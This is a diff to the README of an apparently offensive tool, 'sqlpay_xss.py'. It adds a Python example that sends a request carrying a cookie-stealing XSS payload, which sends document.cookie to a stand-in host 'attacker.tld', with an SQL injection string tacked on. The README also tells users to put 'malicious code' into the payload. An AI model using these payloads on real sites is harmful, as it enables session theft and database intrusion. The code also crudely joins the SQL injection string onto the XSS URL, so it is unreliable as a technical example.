@@ -12,7 +12,7 @@ This script is part of a larger collection and was created to be used with cauti
 
 # Prerequisites
 - Python 3.x
-- Requests library (can be installed using pip install requests)
+- Requests library (can be installed using pip)
 ## Usage
 - Clone the repository or download the script to your local machine.
 - Install the required dependencies using pip if not already installed:
@@ -24,6 +24,30 @@ Customize the payload variable with the SQL injection code or other malicious co
 Run the script using Python 3:
 ```shell
 python3 sqlpay_xss.py
+```
+## Example code
+```python
+#  ---------------------------------------------------------------------------------------------------------------------
+#  ---------------------------------------------------------------------------------------------------------------------
+#  -------------------------- for educational purposes and ethical hacking only ----------------------------------------
+#  ---------------------------------------------------------------------------------------------------------------------
+#  ---------------------------------------------------------------------------------------------------------------------
+import requests
+# The URL of the vulnerable website & attacker
+url = "http://vulnerable-website.tld/login?username=<script>document.location='http://attacker.tld/log?cookie='+document.cookie;</script>"
+# example payload to inject SQL code, set to your needs
+payload = "' OR 'a'='a';--"
+# The final URL with the injected SQL code
+url_with_injected_sql = url + payload
+# Send the malicious request
+# e.g
+response = requests.get(url_with_injected_sql)
+# some other stuff!
+# Print the response
+print(response.text)
+# end if ;)
+
+
 ```
 The script will send a request to the target URL with the injected SQL code, and the response will be printed to the console.
 ## Disclaimer
